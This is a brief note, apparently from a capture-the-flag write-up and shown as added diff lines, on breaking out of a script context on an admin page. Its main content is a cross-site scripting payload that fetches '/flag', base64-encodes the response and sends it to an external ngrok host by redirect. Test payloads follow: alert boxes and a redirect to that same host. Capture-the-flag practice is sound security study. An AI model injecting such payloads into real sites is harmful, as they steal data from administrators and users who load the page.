@@ -1,0 +1,10 @@
+Looking at the source code, it only parses those characters once...after a lot of trial and error, finally got it using the below
+
+this is the payload that gets executed by the admin page
+</script>'<script>javascript:fetch('/flag').then((r)=>r.text()).then((r)=>window.location.href='https://5b79-51-37-39-177.eu.ngrok.io/'+window.btoa(r))</script>
+
+
+
+Testing
+</script>'<script>alert(window.location.href = 'https://5b79-51-37-39-177.eu.ngrok.io/')</script>
+</script><script>alert(1)</script>
